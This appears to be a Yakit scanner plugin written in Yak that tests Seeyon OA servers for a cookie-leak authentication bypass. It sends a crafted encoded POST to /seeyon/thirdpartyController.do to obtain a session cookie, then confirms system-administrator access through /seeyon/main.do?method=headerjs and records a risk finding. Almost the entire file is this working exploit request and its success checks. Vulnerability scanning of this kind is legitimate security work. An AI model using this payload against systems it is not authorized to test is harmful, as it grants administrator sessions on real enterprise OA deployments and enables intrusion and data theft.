yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="seeyon oa cookie leak 漏洞"
    severity="未填写"
    type="漏洞"

    poc_url_r0= url + `/seeyon/thirdpartyController.do`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.body(`method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1
`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 200 && str.Contains(string(header),"JSESSIONID=") && str.Contains(string(body),"/seeyon/common/"){
        r0_flag = true
    }

    poc_url_r1= url + `/seeyon/main.do?method=headerjs`
    req_r1, _ := http.NewRequest("GET",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && str.Contains(string(body),"\"name\":\"系统管理员\"") && str.Contains(string(body),"\"id\":\"-7273032013234748168\""){
        r1_flag = true
    }

    poc_url=poc_url_r1
    if r0_flag && r1_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
